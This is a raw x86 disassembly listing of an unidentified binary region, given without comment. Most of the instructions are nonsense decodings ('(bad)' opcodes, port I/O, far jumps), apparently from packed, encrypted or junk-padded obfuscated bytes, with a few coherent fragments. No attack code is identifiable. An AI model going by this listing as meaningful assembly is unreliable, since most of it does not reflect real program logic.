  4049a0:	enter  0x504f,0x3c
  4049a4:	int    0x20
  4049a6:	mov    ah,0x61
  4049a8:	inc    ebx
  4049a9:	out    dx,eax
  4049aa:	sar    ah,cl
  4049ac:	hlt    
  4049ad:	xor    dl,ah
  4049af:	inc    ecx
  4049b0:	sbb    DWORD PTR [edi-0x78575e72],ebx
  4049b6:	in     eax,dx
  4049b7:	repz mov eax,ds:0xc0bee84
  4049bd:	dec    DWORD PTR [ebp+eiz*4+0x312a81e1]
  4049c4:	sar    DWORD PTR [esi],0x13
  4049c7:	cmp    DWORD PTR [ebp+ecx*1-0x2eac4c2],eax
  4049ce:	(bad)  
  4049d1:	cmc    
  4049d2:	in     eax,dx
  4049d3:	mov    bh,0x9f
  4049d5:	adc    al,BYTE PTR [edx]
  4049d7:	sbb    ebx,DWORD PTR [edx]
  4049d9:	mov    edx,DWORD PTR [ebp-0x24]
  4049dc:	jmp    0x404ab4
  4049e1:	pop    es
  4049e2:	add    ah,bl
  4049e4:	dec    esp
  4049e5:	out    0xed,eax
  4049e7:	scas   eax,DWORD PTR es:[edi]
  4049e8:	dec    ebx
  4049e9:	and    ch,ah
  4049eb:	and    al,0xa1
  4049ed:	data16 mov ds:0x1eae74e3,al
  4049f3:	add    BYTE PTR [eax],al
  4049f5:	mov    ebx,0xf4000000
  4049fa:	or     BYTE PTR [esi-0x40],dl
  4049fd:	mov    ch,0x59
  4049ff:	fiadd  WORD PTR [esi+0x15020b1c]
  404a05:	cld    
  404a06:	lods   al,BYTE PTR ds:[esi]
  404a07:	stos   DWORD PTR es:[edi],eax
  404a08:	xchg   ecx,eax
  404a09:	fdivr  DWORD PTR [eax+0x7348f532]
  404a0f:	mov    al,0x9d
  404a11:	xchg   ebx,eax
  404a12:	push   ebp
  404a13:	inc    ecx
  404a14:	ret    0x27a0
  404a17:	push   eax
  404a18:	in     eax,dx
  404a19:	ds cwde 
  404a1b:	mov    esi,0xae4d42df
  404a20:	pop    ss
  404a21:	cmp    eax,0x8c843981
  404a26:	or     esi,DWORD PTR [edx]
  404a28:	test   edx,ebx
  404a2a:	xchg   edx,eax
  404a2b:	mov    edi,0x210e7335
  404a30:	push   ecx
  404a31:	(bad)  
  404a32:	mov    ds:0x9f5e928c,al
  404a37:	lahf   
  404a38:	cmp    al,0x3d
  404a3a:	pop    ebp
  404a3b:	daa    
  404a3c:	inc    ebx
  404a3d:	pop    edi
  404a3e:	(bad)  
  404a3f:	xor    esi,0x68
  404a42:	xor    DWORD PTR [eax],ebx
  404a44:	pop    ecx
  404a45:	push   edi
  404a46:	push   es
  404a47:	xor    eax,0xb215c96a
  404a4c:	ss je  0x404a71
  404a4f:	pushf  
  404a50:	ret    0x1351
  404a53:	mov    ebx,DWORD PTR [ebx]
  404a55:	scas   al,BYTE PTR es:[edi]
  404a56:	sti    
  404a57:	je     0x404a10
  404a59:	cli    
  404a5a:	fstp   st(6)
  404a5c:	call   0xf415:0x7b82ead9
  404a63:	dec    edx
  404a64:	cmp    dl,bl
  404a66:	push   ebp
  404a67:	call   0x2555:0xb47c4bc4
  404a6e:	fs inc eax
  404a70:	inc    edx
  404a71:	jb     0x404a05
  404a73:	cmp    DWORD PTR [ecx+edi*4+0x7f90293],ecx
  404a7a:	add    edx,DWORD PTR [eax]
  404a7c:	xor    BYTE PTR [edx],dh
  404a7e:	ficomp WORD PTR ds:[ebp+0x39]
  404a82:	cmp    dl,bh
  404a84:	or     esi,DWORD PTR [edx-0x5b]
  404a87:	test   cl,0x37
  404a8a:	arpl   WORD PTR [esi+0x38],bp
  404a8d:	dec    edi
  404a8e:	sar    BYTE PTR [ebp+0x752488fc],1
  404a94:	sub    BYTE PTR [eax+0xccb0315],bh
  404a9a:	and    esp,DWORD PTR [si]
  404a9d:	mov    al,ds:0xe665b7a1
  404aa2:	dec    edx
  404aa3:	sub    edx,esi
  404aa5:	jle    0x404a6f
  404aa7:	je     0x404abc
  404aa9:	add    DWORD PTR [edx+0x380839b9],esi
  404aaf:	mov    eax,0xa8bb44e4
  404ab4:	xor    eax,esi
  404ab6:	jmp    0x404b8e
  404abb:	hlt    
  404abc:	jmp    0xfef7:0xfd1fc81f
  404ac3:	cmp    eax,0x3933cdbd
  404ac8:	cmp    esi,DWORD PTR [ebp+0x1f693f]
  404ace:	add    BYTE PTR [ebx-0x4e000000],bh
  404ad4:	push   esp
  404ad5:	sbb    eax,0x8c666650
  404ada:	or     eax,0x35cac716
  404adf:	dec    edx
  404ae0:	cmp    ebx,DWORD PTR [eax+0x33]
  404ae3:	or     BYTE PTR [edi],dl
  404ae5:	xchg   ecx,eax
  404ae6:	in     al,dx
  404ae7:	jmp    0xc83b63d7
  404aec:	inc    edx
  404aed:	out    0x4c,al
  404aef:	and    BYTE PTR [eax-0x6e676231],ah
  404af5:	push   eax
  404af6:	call   0x991c8ea5
  404afb:	ss pushf 
  404afd:	adc    eax,0x4959afbc
  404b02:	stc    
  404b03:	cmp    ebx,DWORD PTR [esp+ebx*8+0x47]
  404b07:	imul   edx,edi,0xffffff93
  404b0a:	xchg   BYTE PTR [esi+eax*1],dl
  404b0d:	loopne 0x404a8f
  404b0f:	mov    dl,0xec
  404b11:	cmp    esp,0x50
  404b14:	int3   
  404b15:	xchg   BYTE PTR [ecx],bl
  404b17:	pop    si
  404b19:	and    bh,ah
  404b1b:	push   cs
  404b1c:	aas    
  404b1d:	outs   dx,DWORD PTR ds:[esi]
  404b1e:	push   ds
  404b1f:	mov    al,ds:0x7fd195de
  404b24:	sbb    al,0xf7
  404b26:	cmp    DWORD PTR [edx],esi
  404b28:	xchg   esi,eax
  404b29:	or     DWORD PTR [ebx+0x67],edx
  404b2c:	popa   
  404b2d:	inc    esp
  404b2e:	push   eax
  404b2f:	or     dh,BYTE PTR [ebp+0x43]
  404b32:	daa    
  404b33:	inc    ebp
  404b34:	ficomp DWORD PTR [esi]
  404b36:	pop    ebp
  404b37:	add    bh,BYTE PTR [edx+0x2dd703ad]
  404b3d:	ins    BYTE PTR es:[edi],dx
  404b3e:	clc    
  404b3f:	cmp    al,BYTE PTR [eax+edx*2-0x32d61db2]
  404b46:	inc    ebx
  404b47:	push   cs
  404b48:	ja     0x404ad5
  404b4a:	adc    BYTE PTR [eax+eiz*2-0x72],al
  404b4e:	pop    DWORD PTR [ebx-0x47af6523]
  404b54:	add    esp,esp
  404b56:	int3   
  404b57:	jae    0x404b51
  404b59:	adc    eax,0xb10309f3
  404b5e:	jp     0x404bb5
  404b60:	fnstenv [esp+ecx*4]
  404b63:	xchg   esp,eax
  404b64:	xchg   edx,eax
  404b65:	or     eax,0xd0042bcb
  404b6a:	jl     0x404b90
  404b6c:	das    
  404b6d:	jae    0x404b5c
  404b6f:	xor    ebp,DWORD PTR [edx-0x5918137f]
  404b75:	sahf   
  404b76:	(bad)  
  404b78:	enter  0x5cf5,0x30
  404b7c:	cwde   
  404b7d:	sbb    DWORD PTR es:[edi+0x524e5b38],ebx
  404b84:	xor    DWORD PTR [edx+0x1f628e96],ebp
  404b8a:	jle    0x404bdf
  404b8c:	push   ss
  404b8d:	test   BYTE PTR [ebp-0x3b65ef7c],0x70
  404b94:	xor    ecx,DWORD PTR [ecx+0x3d83dc45]
  404b9a:	inc    esp
  404b9b:	cmc    
  404b9c:	inc    edx
  404b9d:	add    BYTE PTR [eax],al
  404b9f:	ja     0x404c91
  404ba5:	inc    DWORD PTR ds:0x42f65c
  404bab:	jmp    0x404c91
  404bb0:	push   DWORD PTR [ebp-0x1c]
  404bb3:	call   DWORD PTR ds:0x4387f4
  404bb9:	jmp    0x404c91
  404bbe:	mov    dh,0xba
  404bc0:	push   esi
  404bc1:	xchg   BYTE PTR [esi-0x12],bl
  404bc4:	idiv   BYTE PTR [edx+0x69dcfa70]
  404bca:	out    0x7,al
  404bcc:	mov    al,0xa1
  404bce:	and    al,0x20
  404bd0:	add    BYTE PTR [eax],al
  404bd2:	mov    ebx,0xda000000
  404bd7:	ror    BYTE PTR [ebp-0x46],0xf9
  404bdb:	les    esi,FWORD PTR [edx-0x5e]
  404bde:	push   edi
  404bdf:	inc    ebx
  404be0:	popa   
  404be1:	mov    edx,0x69a06f4a
  404be6:	jno    0x404c17
  404be8:	fist   DWORD PTR [edx+eax*4+0x6]
  404bec:	lods   al,BYTE PTR ds:[esi]
  404bed:	pop    ebp
  404bee:	jns    0x404bd7
  404bf0:	sub    al,0x5f
  404bf2:	cmp    al,0xc8
  404bf4:	push   esp
  404bf5:	cmp    eax,0xee6bcb3c
  404bfa:	sbb    eax,0x86d04d85
  404bff:	mov    edx,0x2a829d1d
  404c04:	lods   eax,DWORD PTR ds:[esi]
  404c05:	push   ds
  404c06:	fwait
  404c07:	dec    ebp
  404c08:	inc    esp
  404c09:	jne    0x404b95
  404c0b:	addr16 jno 0x404bbc
  404c0e:	cmp    eax,0xcc017ab
  404c13:	inc    edi
  404c14:	sbb    al,0x13
  404c16:	pop    esi
  404c17:	mov    esp,0xf2fb9466
  404c1c:	cmp    edx,edi
  404c1e:	push   esi
  404c1f:	jl     0x404c35
  404c21:	mov    esp,0xb9dc926f
  404c26:	sbb    BYTE PTR [edx],cl
  404c28:	ret    0x41f8
  404c2b:	mov    cl,0x9a
  404c2d:	push   esp
  404c2e:	jge    0x404c13
  404c30:	std    
  404c31:	mov    edx,0x2d0dc289
  404c36:	push   es
  404c37:	int3   
  404c38:	pop    edx
  404c39:	inc    ebx
  404c3a:	mov    bh,0x1
  404c3c:	loope  0x404c26
  404c3e:	inc    eax
  404c3f:	pop    eax
  404c40:	dec    ecx
  404c41:	(bad)  
  404c42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c43:	jg     0x404c7c
  404c45:	sub    BYTE PTR ds:0x8f76fcec,ah
  404c4b:	pop    ss
  404c4c:	(bad)  
  404c4d:	sti    
  404c4e:	inc    ecx
  404c4f:	jmp    0x937e:0x8e2e4d7d
  404c56:	shr    BYTE PTR [edx+0x4d],0x3e
  404c5a:	pushf  
  404c5b:	hlt    
  404c5c:	push   es
  404c5d:	xchg   ebx,eax
  404c5e:	dec    ebp
  404c5f:	inc    ecx
  404c60:	cmp    ecx,DWORD PTR [ebp+ebx*8-0x22]
  404c64:	jmp    0xf26b:0xac3a0f38
  404c6b:	dec    edi
  404c6c:	push   cs
  404c6d:	fadd   QWORD PTR [ebx+eax*1]
  404c70:	or     DWORD PTR [edi-0x5a],eax
  404c73:	nop
  404c74:	in     al,0xfb
  404c76:	xchg   esp,eax
  404c77:	jo     0x404c26
  404c79:	es cmp esi,eax
  404c7c:	popa   
  404c7d:	cmp    ebx,edx
  404c7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c80:	inc    ebx
  404c81:	cmp    eax,0xee5e7deb
  404c86:	in     al,dx
  404c87:	cmp    eax,0xb09a06c0
  404c8c:	jg     0x404c4f
  404c8e:	mov    eax,ds:0x18b546a
  404c93:	mov    edx,DWORD PTR [ecx+0x4]
  404c96:	jmp    0x404d6e
  404c9b:	push   esi
  404c9c:	nop
  404c9d:	mov    ebp,0xde7dff71
  404ca2:	mov    bh,0x94
  404ca4:	cs loope 0x404cb4
  404ca7:	es popa 
  404ca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404caa:	sbb    al,0xdf
  404cac:	and    BYTE PTR [eax],al
  404cae:	add    BYTE PTR [ebx+0x27000000],bh
  404cb4:	idiv   DWORD PTR [ebp+0x6d161f0f]
  404cba:	cmp    bl,cl
  404cbc:	xchg   edi,eax
  404cbd:	xor    ch,BYTE PTR [ebp+0x5e]
  404cc0:	or     al,0x73
  404cc2:	xchg   ebx,eax
  404cc3:	test   BYTE PTR [eax+0x58],dl
  404cc6:	dec    edi
  404cc7:	iret   
  404cc8:	fisttp WORD PTR [ebx]
  404cca:	ret    
  404ccb:	push   ebx
  404ccc:	std    
  404ccd:	pop    ecx
  404cce:	stos   DWORD PTR es:[edi],eax
  404ccf:	mov    edi,DWORD PTR [edx]
  404cd1:	out    dx,al
  404cd2:	gs aaa 
  404cd4:	stos   DWORD PTR es:[edi],eax
  404cd5:	dec    ebx
  404cd6:	shl    DWORD PTR ds:0x7ca642d3,cl
  404cdc:	pop    es
  404cdd:	cmp    al,0xb7
  404cdf:	add    BYTE PTR [eax+0x93e949c],al
  404ce5:	xchg   ebx,eax
  404ce6:	(bad)  
  404ce8:	mov    eax,0x21277d62
  404ced:	adc    BYTE PTR [edx],al
  404cef:	sub    ch,al
  404cf1:	xchg   DWORD PTR [ebx+0x6e],esi
  404cf4:	in     eax,0x82
  404cf6:	mov    ds:0x3bb239fb,eax
  404cfb:	cwde   
  404cfc:	dec    edx
  404cfd:	mov    cl,0xc8
  404cff:	ds dec esp
  404d01:	pop    esi
  404d02:	int3   
  404d03:	ins    BYTE PTR es:[edi],dx
  404d04:	retf   
  404d05:	or     eax,0x4aa6a31f
  404d0a:	mov    BYTE PTR [eax],ch
  404d0c:	sbb    eax,0xe3d0a258
  404d11:	retf   
  404d12:	lea    eax,[edi+0x1d]
  404d15:	les    esi,FWORD PTR [esi-0x7b618b15]
  404d1b:	int    0xa3
  404d1d:	mov    cl,0x42
  404d1f:	aam    0x8d
  404d21:	inc    ecx
  404d22:	clc    
  404d23:	pop    ds
  404d24:	les    ebx,FWORD PTR [ebx+0x4835b85d]
  404d2a:	mov    WORD PTR [ebp+0x6f],?
  404d2d:	js     0x404d57
  404d2f:	cwde   
  404d30:	(bad)  [edx]
  404d32:	les    esi,FWORD PTR [esi+esi*1+0xaf0d06]
  404d39:	call   0xae8faa6a
  404d3e:	xchg   esp,eax
  404d3f:	push   ebp
  404d40:	sbb    bh,BYTE PTR [edx]
  404d42:	cmp    eax,0xb8f18afa
  404d47:	sti    
  404d48:	std    
  404d49:	add    BYTE PTR [ecx],al
  404d4b:	jmp    0xc4b23a41
  404d50:	(bad)  
  404d52:	xor    eax,0x85b49ac0
  404d57:	lds    edi,FWORD PTR [edx]
  404d59:	(bad)  
  404d5a:	shl    DWORD PTR [ebx+0x34ab5bbc],cl
  404d60:	nop
  404d61:	pop    edi
  404d62:	out    0x45,al
  404d64:	or     BYTE PTR [esi+0x29],cl
  404d67:	or     al,0x55
  404d69:	lea    ecx,ds:[edx-0x5c]
  404d6d:	add    al,0x33
  404d6f:	(bad)  
  404d70:	sub    eax,0x66479db3
  404d75:	imul   eax,DWORD PTR [ebp-0x24]
  404d79:	mov    DWORD PTR [ebp-0x24],eax
  404d7c:	sbb    edx,edx
  404d7e:	mov    eax,DWORD PTR [ecx]
  404d80:	adc    edx,DWORD PTR ds:0x42f5b0
  404d86:	mov    edx,DWORD PTR [ecx+0x4]
  404d89:	jmp    0x404e61
  404d8e:	adc    BYTE PTR [ebp-0x4a],0x58
  404d92:	idiv   ebx
  404d94:	out    dx,al
  404d95:	fistp  QWORD PTR [eax]
  404d97:	jmp    0xbc0b:0xa05e33b4
  404d9e:	call   0x0:0xbb000021
  404da5:	add    BYTE PTR [edx-0x160dd112],bl
  404dab:	lods   eax,DWORD PTR ds:[esi]
  404dac:	dec    ecx
  404dad:	das    
  404dae:	lock mov al,ds:0xb317671
  404db4:	jno    0x404e17
  404db6:	gs and al,0x44
  404db9:	sahf   
  404dba:	dec    ecx
  404dbb:	imul   esi,DWORD PTR [edx-0x69531ace],0x9
  404dc2:	stos   BYTE PTR es:[edi],al
  404dc3:	lods   al,BYTE PTR ds:[esi]
  404dc4:	cmp    al,0xab
  404dc6:	sbb    eax,0x89bed5c
  404dcb:	icebp  
  404dcc:	iret   
  404dcd:	std    
  404dce:	sub    DWORD PTR [eax],ecx
  404dd0:	je     0x404d81
  404dd2:	adc    eax,0xa8cb5c92
  404dd7:	inc    ebp
  404dd8:	aaa    
  404dd9:	(bad)  
  404dda:	xchg   ecx,eax
  404ddb:	jecxz  0x404e0f
  404ddd:	mov    ds:0x8bbb6ac1,eax
  404de2:	or     BYTE PTR [edx-0x138d80fc],0x4e
  404de9:	out    0x34,eax
  404deb:	int    0x91
  404ded:	hlt    
  404dee:	jmp    0x404e6c
  404df0:	jnp    0x404d81
  404df2:	fisubr WORD PTR [edi-0x61]
  404df5:	mov    dl,0xc5
  404df7:	sti    
  404df8:	adc    DWORD PTR ds:0xdb93d677,ebx
  404dfe:	adc    ecx,DWORD PTR [esi+0x2e5b9cb2]
  404e04:	jmp    0x3af2233f
  404e09:	mov    edi,esp
  404e0b:	inc    edi
  404e0c:	xor    dl,BYTE PTR [ecx+0x5d]
  404e0f:	cld    
  404e10:	pop    ss
  404e11:	(bad)  
  404e12:	icebp  
  404e13:	or     DWORD PTR [ebp+0x7b],edi
  404e16:	mov    bh,0x88
  404e18:	inc    edi
  404e19:	mov    ds:0xc96a80a,eax
  404e1e:	fnsave [ecx]
  404e20:	and    cl,ah
  404e22:	loop   0x404e04
  404e24:	jb     0x404e56
  404e26:	lds    esp,FWORD PTR [edi]
  404e28:	push   ebp
  404e29:	inc    esi
  404e2a:	stc    
  404e2b:	cmp    DWORD PTR [edi+0x611118ff],esp
  404e31:	outs   dx,DWORD PTR ds:[si]
  404e33:	xor    BYTE PTR [ecx],0x7b
  404e36:	pushw  0x5e
  404e39:	daa    
  404e3a:	imul   esp,DWORD PTR [edi],0xffffff9e
  404e3d:	retf   0x648f
  404e40:	call   0x5e55:0x8efc536e
  404e47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e48:	popf   
  404e49:	ins    DWORD PTR es:[edi],dx
  404e4a:	push   0xffffffb7
  404e4c:	push   edx
  404e4d:	test   DWORD PTR [ebx+0x4f],edi
  404e50:	and    al,0xf2
  404e52:	mov    bl,0xa1
  404e54:	lock gs mov esi,0x743c4e32
  404e5b:	lea    ebp,[ebx]
  404e5d:	adc    eax,0x8b0dd753
  404e62:	push   ebp
  404e63:	adc    BYTE PTR [ecx+0x42f61415],al
  404e69:	add    BYTE PTR [eax],dl
  404e6b:	test   BYTE PTR [edx+0x0],0x33
  404e6f:	mov    BYTE PTR [ecx+0x42f5701d],0x0
  404e76:	js     0x404e6e
  404e78:	inc    edx
  404e79:	add    BYTE PTR [ebx],ch
  404e7b:	inc    ebp
  404e7c:	fadd   QWORD PTR ds:0x99b8624d
  404e82:	mov    DWORD PTR ds:0x42f59c,0x46cf
  404e8c:	cmp    DWORD PTR [edx],eax
  404e8e:	mov    DWORD PTR ds:0x42f60c,edx
  404e94:	mov    eax,DWORD PTR [ebp+0x10]
  404e97:	mov    DWORD PTR ds:0x42f640,0x50b0
  404ea1:	jmp    0x404f79
  404ea6:	and    DWORD PTR cs:[esi-0x100060a3],edx
  404ead:	jae    0x404f10
  404eaf:	push   esi
  404eb0:	in     al,dx
  404eb1:	or     eax,0x3f21b3a5
  404eb6:	push   ebp
  404eb7:	and    al,BYTE PTR [eax]
  404eb9:	add    BYTE PTR [ebx-0x8000000],bh
  404ebf:	sub    DWORD PTR [edi-0x5b10f087],ecx
  404ec5:	xor    DWORD PTR ds:0x126067fc,ebx
  404ecb:	rcl    BYTE PTR [ebx+0x1],cl
  404ece:	mov    al,ds:0xfd3c5d09
  404ed3:	in     al,0x59
  404ed5:	cmp    al,0xf3
  404ed7:	and    eax,0x311a1ef8
  404edc:	jno    0x404f02
  404ede:	add    BYTE PTR [edx-0x2],dh
  404ee1:	sti    
  404ee2:	loope  0x404eef
  404ee4:	adc    dl,al
  404ee6:	jge    0x404eaa
  404ee8:	rcr    BYTE PTR [ebx+eax*8-0x92acf72],1
  404eef:	inc    esp
  404ef0:	mov    esi,0x8564415b
  404ef5:	out    0x12,al
  404ef7:	sub    DWORD PTR [eax+0x5d],esi
  404efa:	out    dx,eax
  404efb:	mov    al,0xeb
  404efd:	inc    edi
  404efe:	pop    ebx
  404eff:	enter  0xc5c6,0xb4
  404f03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f04:	hlt    
  404f05:	test   al,0xe4
  404f07:	pop    ss
  404f08:	hlt    
  404f09:	sbb    ah,BYTE PTR [ecx+ecx*1-0x2d300903]
  404f10:	stos   DWORD PTR es:[edi],eax
  404f11:	bound  ebx,QWORD PTR [ebx]
  404f13:	adc    ebx,edi
  404f15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f16:	pop    ebx
  404f17:	mov    ch,0x36
  404f19:	loopne 0x404f94
  404f1b:	add    eax,0xe36a8ae0
  404f20:	push   ebx
  404f21:	xlat   BYTE PTR ds:[ebx]
  404f22:	(bad)  
  404f23:	neg    BYTE PTR [ebx-0x44ef33c8]
  404f29:	dec    edx
  404f2a:	lea    esi,[ebx-0x35eedb57]
  404f30:	or     DWORD PTR [esi-0x70],esi
  404f33:	dec    ecx
  404f34:	iret   
  404f35:	push   edx
  404f36:	cmp    edi,DWORD PTR [edi]
  404f38:	jge    0x404f73
  404f3a:	sub    al,0x91
  404f3c:	pop    edi
  404f3d:	repnz sub DWORD PTR [edx+0x29],ebp
  404f41:	mov    esi,0xbdd9d2e4
  404f46:	jecxz  0x404f40
  404f48:	mov    bh,0xf3
  404f4a:	lds    edi,FWORD PTR [eax-0x77d0b74d]
  404f50:	fsub   st,st(3)
  404f52:	add    BYTE PTR [ebx+0x114d2ad7],0x4d
  404f59:	stos   BYTE PTR es:[edi],al
  404f5a:	sbb    al,BYTE PTR [esi+0x72]
  404f5d:	(bad)  
  404f5e:	fdivr  QWORD PTR [ebx]
  404f60:	mov    dh,0xb8
  404f62:	out    0xa9,al
  404f64:	in     eax,dx
  404f65:	(bad)  
  404f66:	sar    DWORD PTR [edx-0x10],cl
  404f69:	mov    ebx,0x65c665bb
  404f6e:	repz out dx,al
  404f70:	ins    DWORD PTR es:[edi],dx
  404f71:	popa   
  404f72:	mov    bh,0x83
  404f74:	cs fs xchg ebx,eax
  404f77:	xor    BYTE PTR [esi+0xf],bh
  404f7a:	(bad)  
  404f7b:	nop
  404f7c:	add    eax,0x15290000
  404f81:	test   BYTE PTR fs:[edx+0x0],0xe9
  404f86:	rol    DWORD PTR [eax],cl
  404f88:	add    BYTE PTR [eax],al
  404f8a:	outs   dx,DWORD PTR ds:[esi]
  404f8b:	and    esi,ebx
  404f8d:	cmp    eax,0x73effdff
  404f92:	add    edi,DWORD PTR [bp+si]
  404f95:	faddp  st(2),st
  404f97:	sub    al,0xde
  404f99:	in     al,0x10
  404f9b:	and    eax,DWORD PTR [eax]
  404f9d:	add    BYTE PTR [ebx-0x5000000],bh
  404fa3:	sahf   
  404fa4:	js     0x404feb
  404fa6:	test   al,0x39
  404fa8:	mov    esi,0x66eb4117
  404fad:	cmp    edx,DWORD PTR [ebp+0x71]
  404fb0:	sbb    bl,BYTE PTR [ebx]
  404fb2:	inc    edx
  404fb4:	(bad)  
  404fb5:	in     eax,dx
  404fb6:	adc    eax,0x7aa840e0
  404fbb:	out    dx,eax
  404fbc:	push   esp
  404fbd:	push   es
  404fbe:	and    edi,DWORD PTR [ebp+edi*8+0x138ac4bb]
  404fc5:	lahf   
  404fc6:	sbb    ecx,ebp
  404fc8:	test   BYTE PTR [edi+ebp*1-0x5b4f64ea],0xf6
  404fd0:	div    cl
  404fd2:	adc    ch,BYTE PTR [edx-0x55]
  404fd5:	cmp    al,0xc1
  404fd7:	je     0x404fa7
  404fd9:	xchg   esp,eax
  404fda:	rcr    BYTE PTR [edi],0xe8
  404fdd:	ret    
  404fde:	es jl  0x404fda
  404fe1:	sbb    DWORD PTR [ecx-0x53],ebp
  404fe4:	fstp   QWORD PTR [ebp-0x1a]
  404fe7:	ret    
  404fe8:	ds icebp 
  404fea:	cld    
  404feb:	and    al,0x55
  404fed:	jge    0x405014
  404fef:	test   cl,ah
  404ff1:	pop    ebp
  404ff2:	cmp    ebx,DWORD PTR [edi]
  404ff4:	outs   dx,DWORD PTR ds:[esi]
  404ff5:	jg     0x40500c
  404ff7:	int3   
  404ff8:	dec    esp
  404ff9:	into   
  404ffa:	dec    edi
  404ffb:	mov    ds:0x2c521914,al
  405000:	lods   eax,DWORD PTR ds:[esi]
  405001:	sub    dh,BYTE PTR [esi]
  405003:	jnp    0x405026
  405005:	iret   
  405006:	inc    ebx
  405007:	xor    al,0xae
  405009:	mov    ah,0xf9
  40500b:	sbb    cl,ah
  40500d:	pop    edi
  40500e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40500f:	(bad)  
  405011:	jns    0x404fbb
  405013:	inc    ecx
  405014:	cld    
  405015:	call   0x18a3:0x4e5c51eb
  40501c:	pop    ebp
  40501d:	xchg   edi,eax
  40501e:	inc    ebp
  40501f:	(bad)  
  405020:	adc    eax,0xfe5a5ada
  405025:	shl    DWORD PTR [ebx],cl
  405027:	mov    ah,0xd6
  405029:	outs   dx,BYTE PTR ds:[esi]
  40502a:	xchg   bl,bh
  40502c:	scas   al,BYTE PTR es:[edi]
  40502d:	lock sbb BYTE PTR [bp+di-0x2f],0x5d
  405033:	sub    BYTE PTR [esi],al
  405035:	jnp    0x405031
  405037:	retf   
  405038:	dec    ecx
  405039:	mov    ch,0x81
  40503b:	ss sub ebx,ebx
  40503e:	call   0x9db2f2bc
  405043:	pop    ecx
  405044:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405045:	pop    esi
  405046:	(bad)  
  405047:	push   ecx
  405048:	sub    eax,0x54cc329a
  40504d:	inc    ebx
  40504e:	push   ss
  40504f:	hlt    
  405050:	xor    ebx,DWORD PTR [ecx]
  405052:	cdq    
  405053:	adc    BYTE PTR [ecx],al
  405055:	jns    0x4050aa
  405057:	sub    al,0xeb
  405059:	repz cmp eax,0x45896edd
  40505f:	fcomp  QWORD PTR [ebx]
  405061:	adc    eax,0x42f540
  405066:	mov    eax,DWORD PTR [ebp+0x20]
  405069:	neg    edx
  40506b:	mov    edx,DWORD PTR [ebp+0x24]
  40506e:	xor    eax,esi
  405070:	jmp    0x405148
  405075:	add    DWORD PTR [edi-0x6a],0xffffff8e
  405079:	(bad)  
  40507a:	fistp  WORD PTR [ebx+0x5b205f4f]
  405080:	les    esi,FWORD PTR [edi-0x343225c6]
  405086:	and    eax,DWORD PTR [eax]
  405088:	add    BYTE PTR [ebx-0x2a000000],bh
  40508e:	lds    eax,FWORD PTR [eax-0x23]
  405091:	dec    ecx
  405092:	push   edi
  405093:	add    bh,al
  405095:	and    eax,0x7f6e9ad5
  40509a:	ins    BYTE PTR es:[edi],dx
  40509b:	call   0x17a7:0x6cd50258
  4050a2:	mov    eax,ds:0x1dcf4fb5
  4050a7:	js     0x40506f
  4050a9:	push   0xffffffdc
  4050ab:	mov    DWORD PTR [ecx],0x2dea4e3e
  4050b1:	jmp    FWORD PTR ds:0xacdb8eec
  4050b7:	push   es
  4050b8:	lods   eax,DWORD PTR ds:[esi]
  4050b9:	(bad)  
  4050ba:	pop    edi
  4050bb:	lods   al,BYTE PTR ds:[esi]
  4050bc:	push   ecx
  4050bd:	dec    BYTE PTR [esi]
  4050bf:	mov    BYTE PTR [edi-0x7e],dl
  4050c2:	push   es
  4050c3:	fisubr WORD PTR [edi]
  4050c5:	addr16 xor cl,ch
  4050c8:	jge    0x4050af
  4050ca:	mov    edx,ecx
  4050cc:	out    dx,al
  4050cd:	xor    eax,DWORD PTR [ebx+0x715783a3]
  4050d3:	sub    al,0x30
  4050d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050d6:	add    BYTE PTR [edi],bh
  4050d8:	in     al,dx
  4050d9:	pop    es
  4050da:	sbb    DWORD PTR [ebx+edi*1+0x2b266645],0x70
  4050e2:	mov    DWORD PTR [ecx-0x2f],ebx
  4050e5:	loop   0x40511a
  4050e7:	retf   0x218f
  4050ea:	das    
  4050eb:	jns    0x4050aa
  4050ed:	push   es
  4050ee:	add    BYTE PTR [esi+0x23],bl
  4050f1:	loopne 0x4050f4
  4050f3:	sti    
  4050f4:	int    0xc3
  4050f6:	in     eax,0xc1
  4050f8:	inc    ebx
  4050f9:	or     eax,0xbddbf21d
  4050fe:	into   
  4050ff:	das    
  405100:	fld    TBYTE PTR [ecx+0x9ecbbc6]
  405106:	sub    DWORD PTR [edi+eiz*4-0x2e],0xffffffa7
  40510b:	dec    eax
  40510c:	cs dec ebx
  40510e:	mov    dh,al
  405110:	adc    bh,BYTE PTR [edx+0x3019839a]
  405116:	imul   eax,DWORD PTR [edx-0x6e],0x1314f36d
  40511d:	inc    esp
  40511e:	pop    edi
  40511f:	xor    DWORD PTR [eax+0x35],edx
  405122:	cmp    DWORD PTR [edi],esi
  405124:	test   edx,esi
  405126:	sub    BYTE PTR [ecx+0x3fcd936],bh
  40512c:	sbb    ch,BYTE PTR [ebx+0x5bb995d0]
  405132:	outs   dx,DWORD PTR ds:[esi]
  405133:	xor    eax,ecx
  405135:	and    eax,0xf11e63d2
  40513a:	rcr    esi,1
  40513c:	in     eax,0xb6
  40513e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40513f:	xor    al,0x8c
  405141:	cld    
  405142:	cmp    al,0x9a
  405144:	push   ds
  405145:	inc    ebx
  405146:	call   0x628d5654
  40514b:	mov    eax,0xd3e999
  405150:	add    BYTE PTR [eax],al
  405152:	repz cmp DWORD PTR [ebx],edx
  405155:	sbb    bl,0xaa
  405158:	repz jns 0x405196
  40515b:	or     eax,0x1d10cd7c
  405160:	out    0x92,al
  405162:	xchg   BYTE PTR [eax+eax*1],ah
  405165:	add    BYTE PTR [ebx-0x7b000000],bh
  40516b:	enter  0x96bc,0x6
  40516f:	mov    esi,0x1385bb41
  405174:	adc    ah,BYTE PTR [edx+0x31]
  405177:	fist   WORD PTR [eax]
  405179:	and    BYTE PTR [eax],al
  40517b:	clc    
  40517c:	scas   eax,DWORD PTR es:[edi]
  40517d:	jns    0x405191
  40517f:	push   ss
  405180:	mov    ah,0xed
